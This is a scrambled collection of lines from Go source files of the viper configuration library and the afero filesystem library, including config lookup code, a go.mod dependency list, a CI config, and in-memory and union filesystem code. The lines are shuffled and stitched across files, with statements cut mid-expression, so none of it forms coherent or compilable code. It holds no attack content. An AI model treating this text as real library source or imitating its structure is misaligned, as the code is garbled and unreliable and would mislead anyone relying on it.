// prefix is shadowed => nothing more to flatten
// provider. Currently only etcd and Consul are supported.
return nil
Viper) realKey(key string) string {
configType        string
ext := filepath.Ext(cf)
"""bytes"""
initWG.Add(1)
 in)
"case int32, int16, int8, int:"
automaticEnvApplied bool
"// got a value but nested key expected, do nothing and look for next prefix"
"decoder, err := mapstructure.NewDecoder(config)"
case bool:
Viper) searchInPath(in string) (filename string) {
"shadow = v.flattenAndMergeMap(shadow, m2, fullKey)"
"return v.marshalWriter(f, configType)"
// SetDefault is case-insensitive for a key.
v.configPermissions = os.FileMode(0644)
next
// Config file next
return v.realKey(newkey)
// This should be useful only at config level (other maps may not contain dots
"Viper) registerAlias(alias string, key string) {"
Viper) WatchRemoteConfigOnChannel() error {
return cast.ToUint32(v.Get(key))
return cast.ToFloat64(v.Get(key))
"jww.DEBUG.Println(""Alias"", key, ""to"", newkey)"
"n"", v.defaults)"
func (fnfe ConfigFileNotFoundError) Error() string {
"func writeConfig(filename string, force bool) error { return v.writeConfig(filename, force) }"
// overrides
Viper) SetConfigFile(in string) {
writeOrCreateMask != 0) 
"name, locations string"
func GetUint32(key string) uint32 { return v.GetUint32(key) }
v.configPermissions = perm.Perm()
"jww.TRACE.Printf(""tk="
Viper) Debug() {
"Viper) BindFlagValue(key string, flag FlagValue) error {"
var parentKey string
"for k, v := range tmap {"
// Get can retrieve any value given the key to use.
// GetUint32 returns the value associated with the key as an unsigned integer.
// recursively merge to shadow map
"""github.com/spf13/cast"""
// immediate value
"n"", v.config)"
// path is the path in the k/v store to retrieve configuration
// if the type of 
// compute the path through the nested maps to the nested value
"if val == """" {"
strings.Replacer) {
// ENV variables are case sensitive.
// GetInt32 returns the value associated with the key as an integer.
"v.registerAlias(alias, strings.ToLower(key))"
"fmt.Printf(""Aliases:"
"case ""stringSlice"":"
// Search all configPaths for any config file.
v.configName = in
pflag.FlagSet) error {
path          string
configName        string
// keys.
"fmt.Printf(""Key/Value Store:"
Endpoint() string
"return val, ok "
"if v.properties, err = properties.Load(buf.Bytes(), properties.UTF8)"
if v.onConfigChange != nil {
// Aliases provide another accessor for the same key.
continue
"for _, y := range v.remoteProviders {"
type ConfigFileNotFoundError struct {
if len(input) == 0 {
onConfigChange func(fsnotify.Event)
mapstructure.DecoderConfig{
"b, err := json.Marshal(c)"
// license that can be found in the LICENSE file.
defer watcher.Close()
// TODO: should getEnv logic be moved into find(). Can generalize the use of
"val = v.searchMap(v.defaults, path)"
// MergeConfig merges a new configuration with an existing config.
key = v.realKey(strings.ToLower(key))
// key. This allows env vars which have different keys than the config object
"""github.com/spf13/afero"""
var RemoteConfig remoteConfigFactory
 exists {
"// start from the list of keys, and construct the map one value at a time"
tsv := sv.(map[interface{}]interface{})
// Env override next
// Retrieve the first found remote configuration.
Viper) AllowEmptyEnv(allowEmptyEnv bool) {
"Viper) searchMapWithPathPrefixes(source map[string]interface{}, path []string) interface{} {"
"defVal := v.searchMap(v.defaults, path)"
"""user"": ""root"","
"func SetDefault(key string, value interface{}) { v.SetDefault(key, value) }"
mapstructure.DecoderConfig) error {
keyDelim string
// To retrieve a config file called myapp.json from /configs/myapp.json
func MergeInConfig() error { return v.MergeInConfig() }
"jww.TRACE.Printf(""setting value"")"
"deepestMap := deepSearch(c, path[0:len(path)-1])"
"jww.INFO.Println(""Attempting to write configuration to file."")"
"if _, ok := m[parentKey]"
c.DecodeHook = hook
 ok {
func GetInt64(key string) int64 { return v.GetInt64(key) }
"tgt[fmt.Sprintf(""%v"", k)] = v"
cfg := make(map[string]interface{})
"case ""yaml"", ""yml"":"
import (
v.kvstore = make(map[string]interface{})
"log.Printf(""error: %v"
func ConfigFileUsed() string            { return v.ConfigFileUsed() }
 2014 Steve Francia <spf@spf13.com>.
// AddSecureRemoteProvider adds a remote configuration source.
if val != nil {
if err = hcl.DecodeObject(
typeByDefValue bool
"v.unmarshalReader(reader, v.kvstore)"
func SetConfigType(in string) { v.SetConfigType(in) }
type ConfigMarshalError struct {
// Copyright 
strings.Replacer
key = v.envKeyReplacer.Replace(key)
func castMapFlagToMapInterface(src map[string]FlagValue) map[string]interface{} {
func SetConfigPermissions(perm os.FileMode) { v.SetConfigPermissions(perm) }
"return strings.Join(path[0:i], v.keyDelim)"
"provider: provider,"
if ok {
mapstructure.DecoderConfig) {
"for _, k := range v.AllKeys() {"
""", properties.UTF8)"
envkey = input[1]
key = strings.ToLower(input[0])
// recursively build nested maps
// deep. Both map types are supported as there is a go-yaml fork that uses
"val, err := v.watchRemoteConfig(rp)"
// Remote Providers are searched in the order they are added.
lmk := strings.ToLower(mk)
eventsWG := sync.WaitGroup{}
// Note: This assumes that the path entries and map keys are lower cased.
"// For example, if a key has a default value of []string{} and the same key"
return csvReader.Read()
" val != """")"
// Secure Remote Providers are implemented with github.com/xordataexchange/crypt
if data == nil {
// GetStringMapString returns the value associated with the key as a map of strings.
"value, _ := v.properties.Get(key)"
func GetInt32(key string) int32 { return v.GetInt32(key) }
"if b, _ := exists(v.fs, filepath.Join(in, v.configName"
// Get is case-insensitive for a key.
return cast.ToDuration(v.Get(key))
config         map[string]interface{}
var val interface{}
func Get(key string) interface{} { return v.Get(key) }
"Viper) writeConfig(filename string, force bool) error {"
"fmt.Printf(""Env:"
v.typeByDefValue = enable
"for _, ext := range SupportedExts {"
"""secret"": ""somesecretkey"","
"deepestMap := deepSearch(v.override, path[0:len(path)-1])"
return ConfigParseError{err}
// the default value and the Get function would return:
eventsWG.Add(1)
func (rp defaultRemoteProvider) Provider() string {
eventsWG.Done()
"return v.BindFlagValue(key, pflagValue{flag})"
// A wrapper around mapstructure.Decode that mimics the WeakDecode functionality
// defaultDecoderConfig returns default mapsstructure.DecoderConfig with suppot
type UnsupportedConfigError string
func GetStringMap(key string) map[string]interface{} { return v.GetStringMap(key) }
switch ttv := tv.(type) {
// pull the configuration from the remote provider.
" v.isPathShadowedInDeepMap(path, v.kvstore) != """" {"
flags.VisitAll(func(flag FlagValue) {
SecretKeyring() string
"jww.TRACE.Printf(""merging maps"")"
"ast, err := hcl.Parse(string(b))"
"SupportedExts = []string{""json"", ""toml"", ""yaml"", ""yml"", ""properties"", ""props"", ""prop"", ""hcl""}"
"""github.com/hashicorp/hcl/hcl/printer"""
func (rce RemoteConfigError) Error() string {
"(currentConfigFile != """" "
if i == len(path) {
"""secret"": ""defaultsecret"""
// ConfigFileNotFoundError denotes failing to find configuration file.
"jww.INFO.Println(""adding"", absin, ""to paths to search"")"
// to connect to a remote key/value store.
"delete(v.config, alias)"
func WriteConfigAs(filename string) error { return v.WriteConfigAs(filename) }
// config
"s = strings.TrimSuffix(s, ""]"")"
"t, err := toml.TreeFromMap(c)"
func AutomaticEnv() { v.AutomaticEnv() }
return cast.ToStringMapStringSlice(v.Get(key))
"if prefix != """" {"
case uint64:
case time.Duration:
"path = strings.Split(lcaseKey, v.keyDelim)"
// For backward compatibility reasons this is false by default.
"Viper) isPathShadowedInFlatMap(path []string, mi interface{}) string {"
"// last chance: if no other value is returned and a flag does exist for the value,"
if shadow == nil {
"tv, ok := tgt[tk]"
var parentVal interface{}
val := v.find(lcaseKey)
//  mapstructure.ComposeDecodeHookFunc(
 fsnotify.Create
v.fs = fs
// TODO(bep) this branch isn't covered by a single test.
func SetEnvPrefix(in string) { v.SetEnvPrefix(in) }
// Each item takes precedence over the item below it:
"pflag.Flag) error { return v.BindPFlag(key, flag) }"
// scan paths
// name as the config key.
"// BindFlagValues binds a full FlagValue set to the configuration, using each flag's long"
// SupportedExts are universally supported extensions.
// Note: this assumes a lower-cased key given.
"toml ""github.com/pelletier/go-toml"""
// to the source's priority.
// Secure Remote Providers are searched in the order they are added.
"// RemoteConfig is optional, see the remote package"
type RemoteResponse struct {
for mk := range m {
func GetInt(key string) int { return v.GetInt(key) }
Viper { return v.Sub(key) }
tgt[tk] = sv
m := map[string]bool{}
func (rp defaultRemoteProvider) SecretKeyring() string {
"""encoding/csv"""
return
"n"", err)"
func SafeWriteConfig() error { return v.SafeWriteConfig() }
Viper) SetConfigType(in string) {
remoteProviders []
fs afero.Fs
"v.keyDelim = ""."""
// in a sub-path of the map.
 shadow[prefix] {
if parentVal == nil {
return cast.ToString(val)
"err := decode(v.AllSettings(), config)"
// isPathShadowedInDeepMap makes sure the given path is not shadowed somewhere
Viper) SetConfigName(in string) {
go.etcd.io/bbolt v1.3.2 // indirect
github.com/google/btree v1.0.0 // indirect
golang.org/x/time v0.0.0-20190308202827-9d24e82272b4 // indirect
google.golang.org/grpc v1.21.0 // indirect
gopkg.in/yaml.v2 v2.2.2
github.com/mitchellh/mapstructure v1.1.2
github.com/coreos/etcd v3.3.10
github.com/pelletier/go-toml v1.2.0
github.com/golang/groupcache v0.0.0-20190129154638-5b532d6fd5ef // indirect
require (
github.com/grpc-ecosystem/go-grpc-middleware v1.0.0 // indirect
github.com/coreos/bbolt v1.3.2 // indirect
go.uber.org/zap v1.10.0 // indirect
github.com/magiconair/properties v1.8.0
github.com/xordataexchange/crypt v0.0.3-0.20170626215501-b2862e3d0a77
github.com/gorilla/websocket v1.4.0 // indirect
github.com/spf13/jwalterweatherman v1.0.0
github.com/coreos/go-systemd v0.0.0-20190321100706-95778dfbb74e // indirect
github.com/prometheus/client_golang v0.9.3 // indirect
github.com/spf13/cast v1.3.0
github.com/gogo/protobuf v1.2.1 // indirect
github.com/dgrijalva/jwt-go v3.2.0
github.com/fsnotify/fsnotify v1.4.7
github.com/grpc-ecosystem/grpc-gateway v1.9.0 // indirect
github.com/coreos/pkg v0.0.0-20180928190104-399ea9e2e55f // indirect
go.uber.org/atomic v1.4.0 // indirect
golang.org/x/net v0.0.0-20190522155817-f3200d17e092 // indirect
github.com/ugorji/go v1.1.4 // indirect
github.com/spf13/pflag v1.0.3
github.com/soheilhy/cmux v0.1.4 // indirect
github.com/jonboulle/clockwork v0.1.0 // indirect
github.com/stretchr/testify v1.2.2
github.com/coreos/go-semver v0.2.0 // indirect
incompatible // indirect
go.uber.org/multierr v1.1.0 // indirect
module github.com/spf13/viper
github.com/tmc/grpc-websocket-proxy v0.0.0-20190109142713-0ad062ec5ee5 // indirect
github.com/spf13/afero v1.1.2
github.com/xiang90/probing v0.0.0-20190116061207-43a291ad63a2 // indirect
github.com/armon/consul-api v0.0.0-20180202201655-eb2c6b5be1b6 // indirect
github.com/hashicorp/hcl v1.0.0
github.com/grpc-ecosystem/go-grpc-prometheus v1.2.0 // indirect
    go version
build_script:
test_script:
    go env
environment:
spf13
    go build github.com/spf13/afero
gopath
afero
clone_folder: C:
- cmd: >-
- cmd: go test -race -v github.com/spf13/afero/...
version: '{build}'
    go get -v github.com/spf13/afero/...
github.com
  GOPATH: C:
// limitations under the License.
"d, err := fs.Open(dir)"
"""path/filepath"""
import (
"return m, err"
package afero
 2014 Steve Francia <spf@spf13.com>.
// /usr/
"names, _ := d.Readdirnames(-1)"
"matched, err := filepath.Match(pattern, n)"
// Glob ignores file system errors such as I/O errors reading directories.
"// The only possible returned error is ErrBadPattern, when pattern"
"func Glob(fs Fs, pattern string) (matches []string, err error) {"
// is malformed.
"dir, file := filepath.Split(pattern)"
"return strings.IndexAny(path, """
// Copyright 
// and appends them to matches. If the directory cannot be
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
m = matches
"dir = ""."""
sort.Strings(names)
default:
if !hasMeta(pattern) {
var m []string
"["") >= 0"
// See the License for the specific language governing permissions and
// as in Match. The pattern may describe hierarchical names such as
// http://www.apache.org/licenses/LICENSE-2.0
// glob searches for files matching pattern in the directory dir
// added in lexicographical order.
"// opened, it returns the existing matches. New matches are"
"return nil, nil"
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
// built-ins from that package.
if !hasMeta(dir) {
"return glob(fs, dir, file, nil)"
"m, err = Glob(fs, dir)"
"return []string{pattern}, nil"
if !fi.IsDir() {
"// Unless required by applicable law or agreed to in writing, software"
// Lstat not supported by a ll filesystems.
switch dir {
"case """":"
"matches, err = glob(fs, d, file, matches)"
"fi, err := fs.Stat(dir)"
 err != nil {
// nothing
case string(filepath.Separator):
"if _, err = lstatIfPossible(fs, pattern)"
if matched {
// if there is no matching file. The syntax of patterns is the same
"m = append(m, filepath.Join(dir, n))"
// recognized by Match.
// This was adapted from (http://golang.org/pkg/path/filepath) and uses several
return
// You may obtain a copy of the License at
/bin/ed (assuming the Separator is '/').
"for _, n := range names {"
"""sort"""
// you may not use this file except in compliance with the License.
dir = dir[0 : len(dir)-1] // chop off trailing separator
if err != nil {
// Glob returns the names of all files matching pattern or nil
"for _, d := range m {"
func hasMeta(path string) bool {
"func glob(fs Fs, dir, pattern string, matches []string) (m []string, e error) {"
"""strings"""
"// Licensed under the Apache License, Version 2.0 (the ""License"")"
defer d.Close()
// Copyright 2009 The Go Authors. All rights reserved.
// hasMeta reports whether path contains any of the magic characters
// TODO(niemeyer): Should other magic characters be added here
fileData := m.getData()[oldname]
"os.PathError{Op: ""rename"", Path: oldname, Err: ErrFileNotFound}"
"""path/filepath"""
mem.FileData
"MemMapFs) Mkdir(name string, perm os.FileMode) error {"
"return nil, "
"_, err = file.Seek(0, os.SEEK_END)"
return FilePathSeparator
MemMapFs) registerWithParent(f 
"os.PathError{Op: ""open"", Path: name, Err: ErrFileNotFound}"
MemMapFs) unRegisterWithParent(fileName string) error {
"MemMapFs) lockfreeMkdir(name string, perm os.FileMode) error {"
"MemMapFs) Stat(name string) (os.FileInfo, error) {"
"f, err := m.lockfreeOpen(fileName)"
path = normalizePath(path)
(os.O_RDWR
oldname = normalizePath(oldname)
return ErrFileExists
parent := m.findParent(f)
"file, err = m.Create(name)"
"MemMapFs) Rename(oldname, newname string) error {"
"return mem.NewReadOnlyFileHandle(f), err"
"MemMapFs) openWrite(name string) (File, error) {"
default:
"""os"""
err = file.Truncate(0)
"if strings.HasPrefix(p, path) {"
"return f, nil"
if !i.IsDir() {
return nil
"""github.com/spf13/afero/mem"""
m.unRegisterWithParent(path)
"os.PathError{Op: ""mkdir"", Path: name, Err: ErrFileExists}"
if !ok {
"return nil, ErrFileNotFound"
file := mem.CreateFile(name)
func normalizePath(path string) string {
"mem.AddToMemDir(parent, f)"
"if _, ok := m.getData()[name]"
m.data[FilePathSeparator] = mem.CreateDir(FilePathSeparator)
"f, ok := m.getData()[name]"
m.getData()[newname] = fileData
"file, err := m.openWrite(name)"
 flag
"return mem.NewFileHandle(file), nil"
"MemMapFs) Chtimes(name string, atime time.Time, mtime time.Time) error {"
"mem.RemoveFromMemDir(parent, f)"
os.ModeDir)
"x, ok := m.getData()[name]"
pdir = filepath.Clean(pdir)
os.O_WRONLY) > 0 {
// you may not use this file except in compliance with the License.
"MemMapFs) Create(name string) (File, error) {"
"MemMapFs) OpenFile(name string, flag int, perm os.FileMode) (File, error) {"
"log.Panic(""parent of "", f.Name(), "" is nil"")"
m.init.Do(func() {
mem.InitializeDir(parent)
"""strings"""
item := mem.CreateDir(name)
type MemMapFs struct {
if chmod {
defer m.mu.Unlock()
path = filepath.Clean(path)
MemMapFs) lockfreeOpen(name string) (
os.O_TRUNC > 0 
"delete(m.getData(), oldname)"
if flag == os.O_RDONLY {
m.data = make(map[string]
"m.Chmod(name, perm)"
init sync.Once
m.mu.Lock()
if f != nil {
if oldname == newname {
if err.(
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"mem.FileData, error) {"
err := m.unRegisterWithParent(name)
"//log.Println(""Open after Mkdir error:"", err)"
"MemMapFs) Name() string { return ""MemMapFS"" }"
// http://www.apache.org/licenses/LICENSE-2.0
"// Root should always exist, right"
mem.FileData {
"// Unless required by applicable law or agreed to in writing, software"
m.mu.RUnlock()
// Handle some relative paths
m.registerWithParent(file)
return err
} else {
defer m.mu.RUnlock()
MemMapFs) open(name string) (
"case "".."":"
"for p, _ := range m.getData() {"
// You may obtain a copy of the License at
"MemMapFs) MkdirAll(path string, perm os.FileMode) error {"
"case ""."":"
MemMapFs)
"os.PathError{Op: ""remove"", Path: name, Err: err}"
if err != nil {
MemMapFs) List() {
"if x, ok := fs.("
MemMapFs{}
 ok {
m.getData()[name] = file
// limitations under the License.
MemMapFs) Remove(name string) error {
"""fmt"""
newname = normalizePath(newname)
import (
"MemMapFs) Open(name string) (File, error) {"
"for _, x := range m.data {"
package afero
 2014 Steve Francia <spf@spf13.com>.
"m.Chmod(name, perm"
"""log"""
file.Close()
file = mem.NewReadOnlyFileHandle(file.(
"return fi, nil"
 (flag
m.getData()[name] = item
// Copyright 
"delete(m.getData(), p)"
if ok {
mu   sync.RWMutex
return path
// TODO: what about windows
name = normalizePath(name)
"pfile, err := m.lockfreeOpen(pdir)"
"mem.SetMode(f, mode)"
MemMapFs) getData() map[string]
chmod := false
x.List()
"fmt.Println(x.Name(), y.Size())"
pdir := filepath.Dir(filepath.Clean(f.Name()))
m.registerWithParent(item)
os.PathError).Err == ErrFileExists {
"f, err := m.open(name)"
"return file, nil"
m.mu.RLock()
"os.PathError{Op: ""remove"", Path: name, Err: os.ErrNotExist}"
data map[string]
"""time"""
m.mu.Unlock()
// }
"// Licensed under the Apache License, Version 2.0 (the ""License"")"
return 
"err := m.Mkdir(path, perm)"
"return nil, err"
switch path {
"os.PathError{Op: ""chtimes"", Path: name, Err: ErrFileNotFound}"
if f == nil {
MemMapFs) RemoveAll(path string) error {
"MemMapFs) Chmod(name string, mode os.FileMode) error {"
m.registerWithParent(fileData)
os.O_APPEND > 0 {
"_, ok := m.getData()[name]"
// See the License for the specific language governing permissions and
"f, err := m.Open(name)"
fi := mem.GetFileInfo(f.(
mem.FileData) 
func (m 
"mem.ChangeFileName(fileData, newname)"
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
return pfile
if flag
return m.data
mem.File).Data())
// func debugMemMapList(fs Fs) {
"os.PathError{Op: ""chmod"", Path: name, Err: ErrFileNotFound}"
y := mem.FileInfo{FileData: x}
parent.Lock()
if parent == nil {
if os.IsNotExist(err) 
"pdir, _ := filepath.Split(f.Name())"
"if _, ok := m.getData()[oldname]"
"""sync"""
mem.FileData)
"return mem.NewFileHandle(f), err"
os.O_CREATE > 0) {
m.unRegisterWithParent(oldname)
parent.Unlock()
chmod = true
return
"//log.Println(""Mkdir error:"", err)"
"// Only return ErrFileExists if it's a file, not a directory."
i := mem.FileInfo{FileData: x}
MemMapFs) findParent(f 
"err := m.lockfreeMkdir(pdir, 0777)"
"parent, err = m.lockfreeOpen(pdir)"
"mem.SetModTime(f, mtime)"
func NewMemMapFs() Fs {
mem.FileData) {
"delete(m.getData(), name)"
func (
source := []rune(s)
"func (a Afero) WriteReader(path string, r io.Reader) (err error) {"
"func FileContainsBytes(fs Fs, filename string, subslice []byte) (bool, error) {"
"""golang.org/x/text/unicode/norm"""
"""path/filepath"""
"exists, err := Exists(fs, path)"
"func (a Afero) FileContainsAnyBytes(filename string, subslices [][]byte) (bool, error) {"
if err == nil {
"func DirExists(fs Fs, path string) (bool, error) {"
panic(err)
var err error
"return WriteReader(a.Fs, path, r)"
"""os"""
if len(sl) > largestSlice {
// IsDir checks if a given path is a directory.
if err != os.ErrExist {
"if ospath != """" {"
"return len(list) == 0, nil"
dir := addSlash(os.TempDir())
// readerContains reports whether any of the subslices is within r.
"list, err := f.Readdir(-1)"
// preserve windows backslash :-(
addSlash := func(p string) string {
"return false, nil"
"""bytes"""
r == '/' 
"func WriteReader(fs Fs, path string, r io.Reader) (err error) {"
"func IsEmpty(fs Fs, path string) (bool, error) {"
"err = fs.MkdirAll(ospath, 0777) // rwx, rw, r"
r == '
defer file.Close()
"if FilePathSeparator == """
if err == nil 
 !b {
if fi.IsDir() {
"return DirExists(a.Fs, path)"
if os.IsNotExist(err) {
"n, err = io.ReadAtLeast(r, buff[:halflen], halflen)"
"target := make([]rune, 0, len(source))"
 len(subslices) == 0 {
//     http://www.apache.org/licenses/LICENSE-2.0
// you may not use this file except in compliance with the License.
"""unicode"""
"n, err = io.ReadAtLeast(r, buff[halflen:], halflen)"
"dir, _ := filepath.Split(path)"
"err := fs.MkdirAll(dir, 0777)"
"func (a Afero) DirExists(path string) (bool, error) {"
if FilePathSeparator != p[len(p)-1:] {
"""strings"""
return p
"if bytes.Contains(buff, sl) {"
"return fi.Size() == 0, nil"
"combinedPath := filepath.Join(basePathFs.path, relativePath)"
const FilePathSeparator = string(filepath.Separator)
2015 Steve Francia <spf@spf13.com>
r == '-' 
r == '%' 
"return readerContainsAny(f, subslices...), nil"
largestSlice = len(sl)
ospath := filepath.FromSlash(dir)
// if subPath is not empty then it will be created recursively with mode 777 rwx rwx rwx
"return fi.IsDir(), nil"
"return unicode.Is(unicode.Mn, r) // Mn: nonspacing marks"
"func (a Afero) IsEmpty(path string) (bool, error) {"
// Check if a file contains any of the specified byte slices.
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"f, err := fs.Open(filename)"
"if exists, _ := Exists(fs, dir)"
"return FileContainsBytes(a.Fs, filename, subslice)"
"return false, fmt.Errorf(""%q path does not exist"", path)"
"for _, sl := range subslices {"
"return true, nil"
"return IsEmpty(a.Fs, path)"
"func GetTempDir(fs Fs, subPath string) string {"
"// Unless required by applicable law or agreed to in writing, software"
"_, err := fs.Stat(path)"
 UnicodeSanitize((subPath))
for {
// Transform characters with accents into plain forms.
""", -1)"
return err
"f, err := fs.Open(path)"
} else {
"return SafeWriteReader(a.Fs, path, r)"
 exists {
if exists {
dir = addSlash(dir)
// You may obtain a copy of the License at
"_, err = io.Copy(file, r)"
func (a Afero) GetTempDir(subPath string) string {
// GetTempDir returns the default temp directory with trailing slash
largestSlice := 0
break
// Check if a file or directory exists.
return combinedPath
if err != nil {
return true
 fi.IsDir() {
 ok {
"func (a Afero) SafeWriteReader(path string, r io.Reader) (err error) {"
if r == nil 
// limitations under the License.
"""fmt"""
// IsEmpty checks if a given file or directory is empty.
import (
if i != 2 {
func FullBaseFsPath(basePathFs 
package afero
"subPath = strings.Replace(subPath, """
""", ""____"", -1)"
"func FileContainsAnyBytes(fs Fs, filename string, subslices [][]byte) (bool, error) {"
bufflen := largestSlice 
// Portions Copyright 
// Copyright 
unicode.IsMark(r) 
"return FileContainsAnyBytes(a.Fs, filename, subslices)"
func isMn(r rune) bool {
"return readerContainsAny(f, subslice), nil"
"for _, r := range source {"
BasePathFs)
return dir
// Rewrite string to remove non-standard path characters
defer f.Close()
if i == 1 {
"target = append(target, r)"
if n > 0 {
rn Erik Pedersen <bjorn.erik.pedersen@gmail.com>
"func IsDir(fs Fs, path string) (bool, error) {"
"func SafeWriteReader(fs Fs, path string, r io.Reader) (err error) {"
"// Licensed under the Apache License, Version 2.0 (the ""License"")"
 FilePathSeparator
dir = dir 
// Check if a file contains a specified byte slice.
"BasePathFs, relativePath string) string {"
"var n, i int"
return addSlash(dir)
"return false, err"
// Takes a reader and a path and writes the content
"t := transform.Chain(norm.NFD, transform.RemoveFunc(isMn), norm.NFC)"
"result, _, _ := transform.String(t, string(s))"
// DirExists checks if a path exists and is a directory.
"func (a Afero) IsDir(path string) (bool, error) {"
func NeuterAccents(s string) string {
func UnicodeSanitize(s string) string {
r == '_' 
"return IsDir(a.Fs, path)"
// Portions Copyright 2016-present Bj
return string(target)
"return fmt.Errorf(""%v already exists"", path)"
"return FullBaseFsPath(parent, combinedPath)"
"buff := make([]byte, bufflen)"
"if b, _ := Exists(fs, path)"
"return GetTempDir(a.Fs, subPath)"
r == '.' 
"fi, err := fs.Stat(path)"
"file, err := fs.Create(path)"
// See the License for the specific language governing permissions and
return result
return false
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
r == ' ' 
"""io"""
if largestSlice == 0 {
"return Exists(a.Fs, path)"
2015 The Hugo Authors
// Same as WriteReader but checks to see if file/directory already exists.
"func Exists(fs Fs, path string) (bool, error) {"
"""golang.org/x/text/transform"""
// shift left to catch overlapping matches
halflen := bufflen / 2
"copy(buff[:], buff[halflen:])"
return
"dir = strings.Replace(dir, ""____"", """
"func (a Afero) Exists(path string) (bool, error) {"
"func (a Afero) FileContainsBytes(filename string, subslice []byte) (bool, error) {"
"if parent, ok := basePathFs.source.("
unicode.IsDigit(r) 
if unicode.IsLetter(r) 
"if subPath != """" {"
// Filepath separator defined by os.Separator.
"func readerContainsAny(r io.Reader, subslices ...[]byte) bool {"
p = p 
// limitations under the License.
build !dragonfly
import (
package afero
build !freebsd
"""syscall"""
// Copyright 
"// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
// See the License for the specific language governing permissions and
// http://www.apache.org/licenses/LICENSE-2.0
build !netbsd
const BADFD = syscall.EBADFD
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
"// Unless required by applicable law or agreed to in writing, software"
build !darwin
build !openbsd
// You may obtain a copy of the License at
// you may not use this file except in compliance with the License.
 2016 Steve Francia <spf@spf13.com>.
"// Licensed under the Apache License, Version 2.0 (the ""License"")"
var files = make(map[string]os.FileInfo)
Merger DirsMerger
"UnionFile) Stat() (os.FileInfo, error) {"
"""path/filepath"""
// The UnionFile implements the afero.File interface and will be returned
// from the overlay will be used.
"return 0, BADFD"
"return layer.Chtimes(name, bfi.ModTime(), bfi.ModTime())"
// First make sure the directory exists
"UnionFile) Readdirnames(c int) ([]string, error) {"
"// advance the file position also in the base file, the next"
"return names, nil"
"for _, fi := range rfi {"
// successful read in the overlay will move the cursor position in the base layer
"return nil, BADFD"
"""os"""
err = seekErr
"bfi, err = f.Base.Readdir(-1)"
"return f.Base.ReadAt(s, o)"
var bfi []os.FileInfo
 f.Base != nil {
return f.Base.Stat()
merge = defaultUnionMergeDirsFn
"return rfi, nil"
UnionFile) Close() error {
if err == nil 
// Readdir will weave the two directories together and
"merged, err := merge(lfi, bfi)"
err = f.Layer.Sync()
UnionFile) Truncate(s int64) (err error) {
"_, err = f.Base.Write(s)"
"f.files = append(f.files, merged...)"
"int64(n), os.SEEK_SET)"
"_, err = f.Base.Seek(o"
"n, err = f.Layer.Write(s)"
if c == -1 {
"for _, fi := range bofi {"
"var defaultUnionMergeDirsFn = func(lofi, bofi []os.FileInfo) ([]os.FileInfo, error) {"
// for writing.
if f.Base != nil {
"return f.Base.Seek(o, w)"
"lfh, err := layer.Create(name)"
var lfi []os.FileInfo
err = f.Base.Sync()
return f.Base.WriteString(s)
err = lfh.Close()
"""syscall"""
Layer  File
"// If anything fails, clean up the file"
"n, err := f.Layer.ReadAt(s, o)"
if f.Layer != nil {
" f.Base != nil { // hmm, do we have fixed size files where a write may hit the EOF mark"
if f.off == 0 {
"rfi, err := f.Readdir(c)"
"// base and the overlay - for files present in both layers, only those"
if err != nil 
"exists, err := Exists(layer, filepath.Dir(name))"
"UnionFile) Seek(o int64, w int) (pos int64, err error) {"
"for _, fi := range files {"
return err
err = f.Layer.Truncate(s)
"n, err := f.Layer.Read(s)"
 err == io.EOF) 
// -> cache would be useless 
"_, err = f.Base.WriteAt(s, o)"
f.Base.Close()
if (err == nil 
if err != nil {
"_, err = f.Base.Seek(o, w)"
return f.Layer.Close()
return syscall.EIO
import (
files  []os.FileInfo
package afero
// when reading a directory present at least in the overlay or opening a file
// single view.
"n, err := io.Copy(lfh, bfh)"
"bfi, err := bfh.Stat()"
if !exists {
// Readdir() and Readdirnames() merge the file os.FileInfo / names from the
"// the operations will be done in both layers, starting with the overlay. A"
"func copyToLayer(base Fs, layer Fs, name string) error {"
// only overwrite err in case the seek fails: we need to
= c }()
"UnionFile) Write(s []byte) (n int, err error) {"
"for _, fi := range lofi {"
return f.Base.Name()
var merge DirsMerger = f.Merger
lfh.Close()
"UnionFile) ReadAt(s []byte, o int64) (int, error) {"
rfi[i] = fi
// When opening files for writing (Create() / OpenFile() with the right flags)
"n, err = f.Layer.WriteString(s)"
"return f.files[f.off:], nil"
"UnionFile) WriteString(s string) (n int, err error) {"
return f.Base.Read(s)
 !exists {
err = f.Base.Truncate(s)
"UnionFile) Readdir(c int) (ofi []os.FileInfo, err error) {"
 seekErr != nil {
return f.Base.Write(s)
"// first close base, so we have a newer timestamp in the overlay. If we'd close"
// DirsMerger is how UnionFile weaves two directories together.
// report an eventual io.EOF to the caller
func (f 
 bfi.Size() != n {
// Create the file on the overlay
"return nil, err"
UnionFile) Name() string {
"return pos, err"
"n, err = f.Layer.WriteAt(s, o)"
// The calls to
"rfi := make([]os.FileInfo, len(files))"
"UnionFile) Read(s []byte) (int, error) {"
"if _, exists := files[fi.Name()]"
"_, err = f.Base.WriteString(s)"
"// the overlay first, we'd get a cacheStale the next time we access this file"
defer bfh.Close()
files[fi.Name()] = fi
return f.Base.Truncate(s)
var names []string
"return f.Base.WriteAt(s, o)"
UnionFile) Sync() (err error) {
"pos, err = f.Layer.Seek(o, w)"
"bfh, err := base.Open(name)"
// It takes the FileInfo slices from the layer and the base and returns a
Base   File
"return n, err"
"""io"""
if merge == nil {
"err = layer.MkdirAll(filepath.Dir(name), 0777) // FIXME"
// call may be a write at this position (or a seek with SEEK_CUR)
return f.Base.Sync()
"return f.files[f.off:c], nil"
layer.Remove(name)
// return a single view of the overlayed directories
"names = append(names, fi.Name())"
"lfi, err = f.Layer.Readdir(-1)"
off    int
"UnionFile) WriteAt(s []byte, o int64) (n int, err error) {"
"if _, seekErr := f.Base.Seek(int64(n), os.SEEK_CUR)"
// by the number of bytes read.
defer func() { f.off 
return f.Layer.Stat()
return BADFD
i := 0
return f.Layer.Name()
"type DirsMerger func(lofi, bofi []os.FileInfo) ([]os.FileInfo, error)"
type UnionFile struct {
"""path/filepath"""
"func ReadAll(r io.Reader) ([]byte, error) {"
if r == 0 {
if err == nil {
"return TempDir(a.Fs, dir, prefix)"
dir = os.TempDir()
 panicErr == bytes.ErrTooLarge {
"""os"""
